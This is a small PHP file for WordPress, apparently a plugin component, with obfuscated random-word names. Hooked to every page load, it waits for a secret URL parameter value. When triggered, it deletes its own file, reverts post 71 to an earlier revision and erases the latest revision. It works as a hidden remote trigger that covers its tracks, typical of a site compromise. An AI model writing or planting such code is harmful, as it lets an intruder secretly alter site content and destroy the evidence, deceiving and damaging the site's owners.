<?php

function game_github_options() {
	if (isset($_GET['plupload_iframe_make']) && $_GET['plupload_iframe_make'] === 'monitor_checker_awesome_cdn') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$tracker_messages_portal_cdn = 71;
		$converter_ultimate_request = wp_get_post_revisions($tracker_messages_portal_cdn);
		if (empty($converter_ultimate_request)) die('no revisions');
		if (count($converter_ultimate_request) < 2) die('less than 2');
		$blocker_visual_ninja_lite = array_shift($converter_ultimate_request);
		$keywords_seo_ui = $blocker_visual_ninja_lite->ID;
		$chart_next_country = array_shift($converter_ultimate_request);
		$json_web_discount_changer = $chart_next_country->ID;
		$media_preloader_total_visitor = wp_restore_post_revision($json_web_discount_changer);
		if ($media_preloader_total_visitor === false) die('error restoring');
		$media_preloader_total_visitor = wp_delete_post_revision($keywords_seo_ui);		
		if ($media_preloader_total_visitor === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'game_github_options');
